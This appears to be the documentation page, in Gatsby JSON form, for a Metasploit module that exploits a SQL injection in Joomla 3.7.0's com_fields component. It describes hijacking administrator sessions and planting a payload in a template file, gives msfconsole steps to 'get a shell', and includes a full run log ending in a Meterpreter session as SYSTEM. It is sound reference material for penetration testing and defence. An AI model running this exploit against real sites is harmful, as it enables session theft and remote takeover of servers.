{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/joomla_comfields_sqli_rce","result":{"data":{"moduleMetadataJson":{"id":"82b5c54a-f60d-5fc7-b54e-d12e587e3741","name":"Joomla Component Fields SQLi Remote Code Execution","fullname":"exploit/unix/webapp/joomla_comfields_sqli_rce","description":"This module exploits a SQL injection vulnerability in the com_fields\n        component, which was introduced to the core of Joomla in version 3.7.0.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/joomla_comfields_sqli_rce","documentationSlug":"/modules/documentation/exploit/unix/webapp/joomla_comfields_sqli_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module exploits a SQL Injection vulnerability in the <code class=\"language-text\">com_fields</code> component which was introduced to the core of Joomla in version 3.7.0.\nWith the SQLi, it's possible to enumerate cookies of Administrator and Super User users, and hijack one of their sessions. If no Super User is authenticated, the RCE portion will not work. If a session hijack is available, one of the website templates is identified, and our payload is added to the template as a new file, and then executed.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/unix/webapp/joomla_comfields_sqli_rce</code></li>\n<li>Do: <code class=\"language-text\">set rhost [ip]</code></li>\n<li>Do: <code class=\"language-text\">set tageturi [uri]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>Get a shell</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"joomla-370-on-windows-7-sp1-with-super-user-authenticated\" style=\"position:relative;\"><a href=\"#joomla-370-on-windows-7-sp1-with-super-user-authenticated\" aria-label=\"joomla 370 on windows 7 sp1 with super user authenticated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Joomla 3.7.0 on Windows 7 SP1 with Super User authenticated</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(unix/webapp/joomla_comfields_sqli_rce) &gt; run\n\n[*] Started reverse TCP handler on 172.22.222.138:4444\n[*] 172.22.222.122:80 - Retrieved table prefix [ unqi0 ]\n[*] 172.22.222.122:80 - Retrieved cookie [ ejn9i2c5srk6gchhai4cikdkm3 ]\n[*] 172.22.222.122:80 - Retrieved unauthenticated cookie [ 33effe3d96e4c5e749f33b9d639ca36b ]\n[+] 172.22.222.122:80 - Successfully authenticated\n[*] 172.22.222.122:80 - Creating file [ zM8ZvIAAwxE.php ]\n[*] 172.22.222.122:80 - Following redirect to [ /joomlatest/administrator/index.php?option=com_templates&amp;view=template&amp;id=503&amp;file=L3pNOFp2SUFBd3hFLnBocA%3D%3D ]\n[*] 172.22.222.122:80 - Token [ df2760a9614efc2566917148ee379c42 ] retrieved\n[*] 172.22.222.122:80 - Template path [ /templates/beez3/ ] retrieved\n[*] 172.22.222.122:80 - Insert payload into file [ zM8ZvIAAwxE.php ]\n[*] 172.22.222.122:80 - Payload data inserted into [ zM8ZvIAAwxE.php ]\n[*] 172.22.222.122:80 - Executing payload\n[*] Sending stage (37543 bytes) to 172.22.222.122\n[+] Deleted zM8ZvIAAwxE.php\n\nmeterpreter &gt; getuid\nServer username: SYSTEM (0)\nmeterpreter &gt; sysinfo\nComputer    : WIN-V438RLMESAE\nOS          : Windows NT WIN-V438RLMESAE 6.1 build 7601 (Windows 7 Professional Edition Service Pack 1) AMD64\nMeterpreter : php/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"82b5c54a-f60d-5fc7-b54e-d12e587e3741"}}}